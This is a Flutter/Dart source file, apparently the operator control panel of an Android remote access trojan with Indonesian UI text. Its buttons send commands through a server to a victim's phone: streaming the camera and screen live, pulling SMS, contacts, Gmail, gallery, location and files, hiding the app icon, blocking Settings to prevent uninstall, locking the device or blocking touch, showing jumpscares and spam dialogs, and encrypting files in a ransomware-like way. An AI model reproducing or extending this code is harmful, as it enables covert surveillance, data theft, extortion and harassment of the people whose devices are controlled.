// control_page.dart
import 'package:flutter/material.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'package:socket_io_client/socket_io_client.dart' as IO;

class ControlPage extends StatefulWidget {
  final String token;
  final String deviceId;
  final String deviceName;
  final String baseUrl;
  final Map<String, dynamic> deviceData;
  final IO.Socket? socket;

  const ControlPage({
    super.key,
    required this.token,
    required this.deviceId,
    required this.deviceName,
    required this.baseUrl,
    required this.deviceData,
    this.socket,
  });

  @override
  State<ControlPage> createState() => _ControlPageState();
}

class _ControlPageState extends State<ControlPage> {
  Map<String, dynamic> _status = {};
  Map<String, dynamic> _info = {};
  bool _isLoading = true;
  bool _isConnected = true;
  String? _lastFrame;

  @override
  void initState() {
    super.initState();
    _status = widget.deviceData['status'] ?? {};
    _info = widget.deviceData['info'] ?? {};
    _isConnected = _status['online'] != false;
    _isLoading = false;
    _setupSocketListeners();
  }

  void _setupSocketListeners() {
    // 🔥 STATUS UPDATE DARI SERVER
    widget.socket?.on('status:${widget.deviceId}', (data) {
      if (mounted) {
        setState(() {
          _status = {..._status, ...data};
          _isConnected = _status['online'] != false;
        });
      }
    });

    // 🔥 CAMERA FRAME
    widget.socket?.on('camera:frame', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        setState(() {
          _lastFrame = data['frame'];
        });
      }
    });

    // 🔥 SCREEN FRAME
    widget.socket?.on('screen:frame', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle screen frame
      }
    });

    // 🔥 SMS LIST
    widget.socket?.on('sms:list', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle SMS
      }
    });

    // 🔥 NOTIF LIST
    widget.socket?.on('notif:list', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Notif
      }
    });

    // 🔥 GALLERY
    widget.socket?.on('device:gallery', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Gallery
      }
    });

    // 🔥 LOCATION
    widget.socket?.on('device:location', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Location
      }
    });

    // 🔥 CONTACTS
    widget.socket?.on('device:contacts', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Contacts
      }
    });

    // 🔥 GMAIL
    widget.socket?.on('device:gmail', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Gmail
      }
    });

    // 🔥 PHONE
    widget.socket?.on('device:phone', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Phone
      }
    });

    // 🔥 FILES
    widget.socket?.on('device:files', (data) {
      if (data is Map && data['deviceId'] == widget.deviceId) {
        // Handle Files
      }
    });
  }

  // 🔥 ENDPOINT: POST /api/command/:deviceId
  Future<void> _sendCommand(String command, dynamic value) async {
    try {
      final response = await http.post(
        Uri.parse('${widget.baseUrl}/api/command/${widget.deviceId}'),
        headers: {
          'Content-Type': 'application/json',
          'x-auth-token': widget.token,
        },
        body: jsonEncode({
          'command': command,
          'value': value,
        }),
      );

      if (response.statusCode == 401) {
        if (!mounted) return;
        _showSessionExpired();
        return;
      }

      if (response.statusCode == 200) {
        setState(() {
          _updateStatus(command, value);
        });
        _showToast('${command.toUpperCase()} berhasil');
      } else {
        _showToast('Gagal: ${response.body}', isError: true);
      }
    } catch (e) {
      _showToast('Gagal mengirim perintah: $e', isError: true);
    }
  }

  void _updateStatus(String command, dynamic value) {
    switch (command) {
      case 'flashlight':
        _status['flashlight'] = value == true || value == 'true';
        break;
      case 'lockDevice':
        _status['deviceLocked'] = true;
        break;
      case 'unlockDevice':
        _status['deviceLocked'] = false;
        break;
      case 'camera':
        _status['cameraActive'] = value != 'off';
        break;
      case 'screen':
        _status['screenActive'] = value == 'start';
        break;
      case 'jumpscareStart':
        _status['jumpscareActive'] = true;
        break;
      case 'jumpscareStop':
        _status['jumpscareActive'] = false;
        break;
      case 'hideIcon':
        _status['iconHidden'] = value == 'true';
        break;
      case 'muteVolume':
        _status['volumeMuted'] = value == 'true';
        break;
      case 'touchBlock':
        _status['touchBlocked'] = true;
        break;
      case 'touchBlockStop':
        _status['touchBlocked'] = false;
        break;
      case 'ttsSpeak':
        _status['ttsSpeaking'] = true;
        break;
      case 'ttsStop':
        _status['ttsSpeaking'] = false;
        break;
      case 'videoOverlay':
        _status['videoOverlayActive'] = true;
        break;
      case 'videoOverlayHide':
        _status['videoOverlayActive'] = false;
        break;
      case 'dialogSpam':
        _status['dialogSpamActive'] = true;
        break;
      case 'dialogSpamStop':
        _status['dialogSpamActive'] = false;
        break;
      case 'jumpscare2Start':
        _status['jumpscare2Active'] = true;
        break;
      case 'jumpscare2Stop':
        _status['jumpscare2Active'] = false;
        break;
      case 'encFile':
        _status['encActive'] = true;
        break;
    }
  }

  void _showToast(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(
      SnackBar(
        content: Text(message),
        backgroundColor: isError ? const Color(0xFFFF4D6D) : const Color(0xFF1D6FFF),
        duration: const Duration(seconds: 2),
      ),
    );
  }

  void _showSessionExpired() {
    showDialog(
      context: context,
      barrierDismissible: false,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF050d1f),
        title: const Text(
          'Sesi Berakhir',
          style: TextStyle(color: Colors.white),
        ),
        content: const Text(
          'Silakan login kembali',
          style: TextStyle(color: Color(0xFF8ab4e0)),
        ),
        actions: [
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              Navigator.pop(context);
            },
            child: const Text('OK'),
          ),
        ],
      ),
    );
  }

  // ==================== DIALOG ====================

  void _showTTSDialog() {
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF050d1f),
        title: const Text(
          'Text to Speech',
          style: TextStyle(color: Colors.white),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const TextField(
              style: TextStyle(color: Colors.white),
              decoration: InputDecoration(
                hintText: 'Ketik teks...',
                hintStyle: TextStyle(color: Color(0xFF3d6080)),
                filled: true,
                fillColor: Color(0xFF081428),
                border: OutlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF1a3050)),
                ),
              ),
            ),
            const SizedBox(height: 10),
            Row(
              children: [
                Expanded(
                  child: TextField(
                    decoration: const InputDecoration(
                      labelText: 'Pitch',
                      labelStyle: TextStyle(color: Color(0xFF3d6080)),
                      filled: true,
                      fillColor: Color(0xFF081428),
                    ),
                    style: const TextStyle(color: Colors.white),
                    keyboardType: TextInputType.number,
                    controller: TextEditingController(text: '1.0'),
                  ),
                ),
                const SizedBox(width: 10),
                Expanded(
                  child: TextField(
                    decoration: const InputDecoration(
                      labelText: 'Speed',
                      labelStyle: TextStyle(color: Color(0xFF3d6080)),
                      filled: true,
                      fillColor: Color(0xFF081428),
                    ),
                    style: const TextStyle(color: Colors.white),
                    keyboardType: TextInputType.number,
                    controller: TextEditingController(text: '1.0'),
                  ),
                ),
              ],
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Color(0xFF3d6080))),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand('ttsSpeak', 'Test text');
            },
            child: const Text('BICARA', style: TextStyle(color: Color(0xFFA855F7))),
          ),
        ],
      ),
    );
  }

  void _showDialogSpamDialog() {
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF050d1f),
        title: const Text(
          'Dialog Spam',
          style: TextStyle(color: Colors.white),
        ),
        content: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            const TextField(
              style: TextStyle(color: Colors.white),
              decoration: InputDecoration(
                hintText: 'Pesan spam...',
                hintStyle: TextStyle(color: Color(0xFF3d6080)),
                filled: true,
                fillColor: Color(0xFF081428),
                border: OutlineInputBorder(
                  borderSide: BorderSide(color: Color(0xFF1a3050)),
                ),
              ),
            ),
          ],
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Color(0xFF3d6080))),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand('dialogSpam', '7x spam');
            },
            child: const Text('SPAM', style: TextStyle(color: Color(0xFFE2E8F0))),
          ),
        ],
      ),
    );
  }

  void _showUrlDialog(String type) {
    showDialog(
      context: context,
      barrierDismissible: true,
      builder: (context) => AlertDialog(
        backgroundColor: const Color(0xFF050d1f),
        title: Text(
          type == 'wallpaper' ? 'Set Wallpaper' :
          type == 'openurl' ? 'Open URL' :
          type == 'playaudio' ? 'Play Audio' :
          type == 'showtoast' ? 'Toast Message' : 'Jumpscare',
          style: const TextStyle(color: Colors.white),
        ),
        content: TextField(
          style: const TextStyle(color: Colors.white),
          decoration: InputDecoration(
            hintText: type == 'showtoast' ? 'Ketik pesan...' : 'Masukkan URL...',
            hintStyle: const TextStyle(color: Color(0xFF3d6080)),
            filled: true,
            fillColor: const Color(0xFF081428),
            border: const OutlineInputBorder(
              borderSide: BorderSide(color: Color(0xFF1a3050)),
            ),
          ),
        ),
        actions: [
          TextButton(
            onPressed: () => Navigator.pop(context),
            child: const Text('Batal', style: TextStyle(color: Color(0xFF3d6080))),
          ),
          TextButton(
            onPressed: () {
              Navigator.pop(context);
              _sendCommand(type, 'https://example.com');
            },
            child: const Text('Kirim', style: TextStyle(color: Color(0xFF4d8fff))),
          ),
        ],
      ),
    );
  }

  // ==================== BUILD ====================

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: const Color(0xFF020510),
      appBar: AppBar(
        backgroundColor: const Color(0xFF050d1f),
        title: Row(
          children: [
            const Icon(
              Icons.phone_android,
              color: Color(0xFF4d8fff),
              size: 20,
            ),
            const SizedBox(width: 8),
            Expanded(
              child: Text(
                widget.deviceName,
                style: const TextStyle(
                  color: Colors.white,
                  fontSize: 16,
                  fontWeight: FontWeight.w600,
                ),
                overflow: TextOverflow.ellipsis,
              ),
            ),
          ],
        ),
        actions: [
          IconButton(
            icon: const Icon(Icons.refresh, color: Color(0xFF4d8fff)),
            onPressed: () {
              _sendCommand('getStatus', '');
            },
          ),
        ],
        elevation: 0,
        bottom: PreferredSize(
          preferredSize: const Size.fromHeight(1),
          child: Container(
            height: 1,
            color: const Color(0xFF112240),
          ),
        ),
      ),
      body: _isLoading
          ? const Center(
              child: CircularProgressIndicator(
                color: Color(0xFF1D6FFF),
              ),
            )
          : SingleChildScrollView(
              padding: const EdgeInsets.all(16),
              child: Column(
                crossAxisAlignment: CrossAxisAlignment.start,
                children: [
                  _buildStatusCard(),
                  const SizedBox(height: 16),
                  _buildSectionTitle('KONTROL DEVICE'),
                  const SizedBox(height: 10),
                  _buildControlGrid(),
                  const SizedBox(height: 16),
                  _buildSectionTitle('STREAMING'),
                  const SizedBox(height: 10),
                  _buildStreamingGrid(),
                  const SizedBox(height: 16),
                  _buildSectionTitle('AKSI CEPAT'),
                  const SizedBox(height: 10),
                  _buildActionGrid(),
                  const SizedBox(height: 16),
                  _buildSectionTitle('INFO & STORAGE'),
                  const SizedBox(height: 10),
                  _buildInfoGrid(),
                ],
              ),
            ),
    );
  }

  Widget _buildSectionTitle(String title) {
    return Text(
      title,
      style: const TextStyle(
        color: Color(0xFF3d6080),
        fontSize: 10,
        fontWeight: FontWeight.w600,
        letterSpacing: 2,
      ),
    );
  }

  Widget _buildStatusCard() {
    final battery = _info['battery'] ?? -1;
    final isCharging = _info['charging'] ?? false;
    final androidVersion = _info['androidVersion'] ?? '?';
    final sdkVersion = _info['sdkVersion'] ?? '?';
    final ip = _info['ip'] ?? 'IP tidak tersedia';

    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Color(0xFF081428), Color(0xFF050d1f)],
        ),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: _isConnected ? const Color(0xFF1D6FFF).withOpacity(0.2) : const Color(0xFFFF4D6D).withOpacity(0.2),
        ),
      ),
      child: Column(
        children: [
          Row(
            children: [
              Container(
                width: 10,
                height: 10,
                decoration: BoxDecoration(
                  color: _isConnected ? const Color(0xFF00E5A0) : const Color(0xFFFF4D6D),
                  shape: BoxShape.circle,
                  boxShadow: _isConnected
                      ? [BoxShadow(color: const Color(0xFF00E5A0).withOpacity(0.5), blurRadius: 8)]
                      : null,
                ),
              ),
              const SizedBox(width: 8),
              Text(
                _isConnected ? 'ONLINE' : 'OFFLINE',
                style: TextStyle(
                  color: _isConnected ? const Color(0xFF00E5A0) : const Color(0xFFFF4D6D),
                  fontWeight: FontWeight.w700,
                  fontSize: 12,
                  letterSpacing: 1,
                ),
              ),
              const Spacer(),
              if (battery >= 0) ...[
                Icon(
                  isCharging ? Icons.battery_charging_full : Icons.battery_std,
                  color: battery <= 20 ? const Color(0xFFFF4D6D) : battery <= 40 ? const Color(0xFFFFC34D) : const Color(0xFF00E5A0),
                  size: 18,
                ),
                const SizedBox(width: 4),
                Text(
                  '$battery%',
                  style: TextStyle(
                    color: battery <= 20 ? const Color(0xFFFF4D6D) : battery <= 40 ? const Color(0xFFFFC34D) : const Color(0xFF00E5A0),
                    fontWeight: FontWeight.w600,
                    fontSize: 13,
                  ),
                ),
              ],
            ],
          ),
          const SizedBox(height: 10),
          Row(
            children: [
              _buildInfoChip(Icons.android, 'Android', androidVersion),
              const SizedBox(width: 10),
              _buildInfoChip(Icons.code, 'SDK', '$sdkVersion'),
              const SizedBox(width: 10),
              _buildInfoChip(Icons.wifi, 'IP', ip),
            ],
          ),
          const SizedBox(height: 8),
          Row(
            children: [
              _buildInfoChip(Icons.phone_android, 'Device ID', widget.deviceId),
            ],
          ),
        ],
      ),
    );
  }

  Widget _buildInfoChip(IconData icon, String label, String value) {
    return Expanded(
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
        decoration: BoxDecoration(
          color: const Color(0xFF0d1e38),
          borderRadius: BorderRadius.circular(6),
          border: Border.all(color: const Color(0xFF1a3050)),
        ),
        child: Row(
          mainAxisSize: MainAxisSize.min,
          children: [
            Icon(icon, color: const Color(0xFF3d6080), size: 12),
            const SizedBox(width: 3),
            Expanded(
              child: Text(
                value,
                style: const TextStyle(
                  color: Color(0xFF8ab4e0),
                  fontSize: 9,
                  fontWeight: FontWeight.w500,
                ),
                overflow: TextOverflow.ellipsis,
                maxLines: 1,
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildControlGrid() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 2,
      crossAxisSpacing: 10,
      mainAxisSpacing: 10,
      children: [
        _ControlTile(
          icon: Icons.flash_on,
          label: 'Flashlight',
          isActive: _status['flashlight'] == true,
          onToggle: (value) => _sendCommand('flashlight', value),
          iconColor: const Color(0xFF4d8fff),
        ),
        _ControlTile(
          icon: Icons.lock,
          label: 'Lock Device',
          isActive: _status['deviceLocked'] == true,
          onToggle: (value) => _sendCommand(value ? 'lockDevice' : 'unlockDevice', 'true'),
          iconColor: const Color(0xFFA78BFA),
        ),
        _ControlTile(
          icon: Icons.visibility_off,
          label: 'Hide Icon',
          isActive: _status['iconHidden'] == true,
          onToggle: (value) => _sendCommand('hideIcon', value.toString()),
          iconColor: const Color(0xFFFB923C),
        ),
        _ControlTile(
          icon: Icons.volume_off,
          label: 'Mute Volume',
          isActive: _status['volumeMuted'] == true,
          onToggle: (value) => _sendCommand('muteVolume', value.toString()),
          iconColor: const Color(0xFF22C55E),
        ),
        _ControlTile(
          icon: Icons.touch_app,
          label: 'Touch Block',
          isActive: _status['touchBlocked'] == true,
          onToggle: (value) => _sendCommand(value ? 'touchBlock' : 'touchBlockStop', ''),
          iconColor: const Color(0xFFFF9F1C),
        ),
        _ControlTile(
          icon: Icons.record_voice_over,
          label: 'TTS Speak',
          isActive: _status['ttsSpeaking'] == true,
          onTap: () => _showTTSDialog(),
          iconColor: const Color(0xFFA855F7),
        ),
        _ControlTile(
          icon: Icons.warning_amber,
          label: 'Jumpscare',
          isActive: _status['jumpscareActive'] == true,
          onToggle: (value) => _sendCommand(value ? 'jumpscareStart' : 'jumpscareStop', value ? 'https://files.catbox.moe/dihycl.jpg' : 'true'),
          iconColor: const Color(0xFFFF4D6D),
        ),
        _ControlTile(
          icon: Icons.notifications_active,
          label: 'Dialog Spam',
          isActive: _status['dialogSpamActive'] == true,
          onTap: () => _showDialogSpamDialog(),
          iconColor: const Color(0xFFE2E8F0),
        ),
        _ControlTile(
          icon: Icons.video_library,
          label: 'Video Overlay',
          isActive: _status['videoOverlayActive'] == true,
          onTap: () => _sendCommand('videoOverlay', ''),
          iconColor: const Color(0xFFF87171),
        ),
        _ControlTile(
          icon: Icons.warning,
          label: 'Jumpscare V2',
          isActive: _status['jumpscare2Active'] == true,
          onToggle: (value) => _sendCommand(value ? 'jumpscare2Start' : 'jumpscare2Stop', value ? 'https://files.catbox.moe/ulrmbb.jpg' : 'true'),
          iconColor: const Color(0xFFFF4D6D),
        ),
        _ControlTile(
          icon: Icons.lock_outline,
          label: 'Lock Custom',
          isActive: _status['lockCustomActive'] == true,
          onTap: () => _sendCommand('lockCustom', '<html>Lock Custom</html>'),
          iconColor: const Color(0xFFA78BFA),
        ),
        _ControlTile(
          icon: Icons.palette,
          label: 'Change Theme',
          isActive: false,
          onTap: () => _sendCommand('changeTheme', 'default'),
          iconColor: const Color(0xFFFFC34D),
        ),
        _ControlTile(
          icon: Icons.vibration,
          label: 'Vibrate',
          isActive: false,
          onTap: () => _sendCommand('vibrate', '500'),
          iconColor: const Color(0xFFA78BFA),
        ),
        _ControlTile(
          icon: Icons.image,
          label: 'Wallpaper',
          isActive: false,
          onTap: () => _showUrlDialog('wallpaper'),
          iconColor: const Color(0xFFA78BFA),
        ),
        _ControlTile(
          icon: Icons.open_in_browser,
          label: 'Open URL',
          isActive: false,
          onTap: () => _showUrlDialog('openurl'),
          iconColor: const Color(0xFF00E5A0),
        ),
        _ControlTile(
          icon: Icons.music_note,
          label: 'Play Audio',
          isActive: false,
          onTap: () => _showUrlDialog('playaudio'),
          iconColor: const Color(0xFF4d8fff),
        ),
        _ControlTile(
          icon: Icons.message,
          label: 'Toast Message',
          isActive: false,
          onTap: () => _showUrlDialog('showtoast'),
          iconColor: const Color(0xFFFFC34D),
        ),
        _ControlTile(
          icon: Icons.folder,
          label: 'ENC FILE',
          isActive: _status['encActive'] == true,
          onToggle: (value) => _sendCommand('encFile', value ? 'encrypt' : 'decrypt'),
          iconColor: const Color(0xFFFFD700),
        ),
        _ControlTile(
          icon: Icons.block,
          label: 'Anti Uninstall',
          isActive: _status['antiUninstall'] == true,
          onToggle: (value) => _sendCommand(value ? 'blockApp' : 'unblockApp', value ? 'com.android.settings' : 'com.android.settings'),
          iconColor: const Color(0xFFFF4D6D),
        ),
      ],
    );
  }

  Widget _buildStreamingGrid() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 2,
      crossAxisSpacing: 10,
      mainAxisSpacing: 10,
      children: [
        _ControlTile(
          icon: Icons.videocam,
          label: 'Camera Live',
          isActive: _status['cameraActive'] == true,
          onToggle: (value) => _sendCommand('camera', value ? 'back' : 'off'),
          iconColor: const Color(0xFFFF4D6D),
        ),
        _ControlTile(
          icon: Icons.screenshot,
          label: 'Screenshot',
          isActive: false,
          onTap: () => _sendCommand('screenshot', 'front'),
          iconColor: const Color(0xFFFFC34D),
        ),
        _ControlTile(
          icon: Icons.screen_share,
          label: 'Screen Live',
          isActive: _status['screenActive'] == true,
          onToggle: (value) => _sendCommand('screen', value ? 'start' : 'stop'),
          iconColor: const Color(0xFF00D4FF),
        ),
        _ControlTile(
          icon: Icons.camera_front,
          label: 'Camera Front',
          isActive: _status['cameraActive'] == true,
          onTap: () => _sendCommand('camera', 'front'),
          iconColor: const Color(0xFFFF4D6D),
        ),
        _ControlTile(
          icon: Icons.camera_rear,
          label: 'Camera Back',
          isActive: _status['cameraActive'] == true,
          onTap: () => _sendCommand('camera', 'back'),
          iconColor: const Color(0xFFFF4D6D),
        ),
      ],
    );
  }

  Widget _buildActionGrid() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 2,
      crossAxisSpacing: 10,
      mainAxisSpacing: 10,
      children: [
        _ControlTile(
          icon: Icons.location_on,
          label: 'GPS Lokasi',
          isActive: false,
          onTap: () => _sendCommand('getLocation', ''),
          iconColor: const Color(0xFF00E5A0),
        ),
        _ControlTile(
          icon: Icons.contacts,
          label: 'Kontak',
          isActive: false,
          onTap: () => _sendCommand('getContacts', ''),
          iconColor: const Color(0xFFFFC34D),
        ),
        _ControlTile(
          icon: Icons.email,
          label: 'Gmail',
          isActive: false,
          onTap: () => _sendCommand('getGmail', ''),
          iconColor: const Color(0xFFFF4D6D),
        ),
        _ControlTile(
          icon: Icons.phone,
          label: 'Phone Info',
          isActive: false,
          onTap: () => _sendCommand('getPhone', ''),
          iconColor: const Color(0xFF34D399),
        ),
        _ControlTile(
          icon: Icons.message,
          label: 'SMS & Notif',
          isActive: false,
          onTap: () {
            _sendCommand('getSms', '');
            _sendCommand('getNotifs', '');
          },
          iconColor: const Color(0xFFA78BFA),
        ),
        _ControlTile(
          icon: Icons.photo_library,
          label: 'Galeri',
          isActive: false,
          onTap: () => _sendCommand('getGallery', ''),
          iconColor: const Color(0xFF4d8fff),
        ),
      ],
    );
  }

  Widget _buildInfoGrid() {
    return GridView.count(
      shrinkWrap: true,
      physics: const NeverScrollableScrollPhysics(),
      crossAxisCount: 2,
      crossAxisSpacing: 10,
      mainAxisSpacing: 10,
      children: [
        _ControlTile(
          icon: Icons.folder,
          label: 'File Manager',
          isActive: false,
          onTap: () => _sendCommand('getFiles', '/sdcard'),
          iconColor: const Color(0xFFFFC34D),
        ),
        _ControlTile(
          icon: Icons.apps,
          label: 'Installed Apps',
          isActive: false,
          onTap: () => _sendCommand('getInstalledApps', ''),
          iconColor: const Color(0xFFA78BFA),
        ),
        _ControlTile(
          icon: Icons.download,
          label: 'Download File',
          isActive: false,
          onTap: () => _sendCommand('downloadFile', '/sdcard/Download/test.txt'),
          iconColor: const Color(0xFF4d8fff),
        ),
      ],
    );
  }
}

class _ControlTile extends StatelessWidget {
  final IconData icon;
  final String label;
  final bool isActive;
  final VoidCallback? onTap;
  final Function(bool)? onToggle;
  final Color iconColor;

  const _ControlTile({
    required this.icon,
    required this.label,
    required this.isActive,
    this.onTap,
    this.onToggle,
    required this.iconColor,
  });

  @override
  Widget build(BuildContext context) {
    return Container(
      decoration: BoxDecoration(
        gradient: const LinearGradient(
          begin: Alignment.topLeft,
          end: Alignment.bottomRight,
          colors: [Color(0xFF081428), Color(0xFF050d1f)],
        ),
        borderRadius: BorderRadius.circular(14),
        border: Border.all(
          color: isActive ? iconColor.withOpacity(0.4) : const Color(0xFF1a3050),
        ),
      ),
      child: InkWell(
        onTap: onTap ?? (onToggle != null ? () => onToggle!(!isActive) : null),
        borderRadius: BorderRadius.circular(14),
        child: Padding(
          padding: const EdgeInsets.all(12),
          child: Column(
            mainAxisAlignment: MainAxisAlignment.center,
            children: [
              Icon(
                icon,
                color: isActive ? iconColor : const Color(0xFF3d6080),
                size: 28,
              ),
              const SizedBox(height: 8),
              Text(
                label,
                style: TextStyle(
                  color: isActive ? Colors.white : const Color(0xFF3d6080),
                  fontSize: 11,
                  fontWeight: isActive ? FontWeight.w600 : FontWeight.w400,
                ),
                textAlign: TextAlign.center,
              ),
              if (isActive)
                Container(
                  margin: const EdgeInsets.only(top: 4),
                  width: 6,
                  height: 6,
                  decoration: BoxDecoration(
                    color: iconColor,
                    shape: BoxShape.circle,
                    boxShadow: [BoxShadow(color: iconColor.withOpacity(0.5), blurRadius: 8)],
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}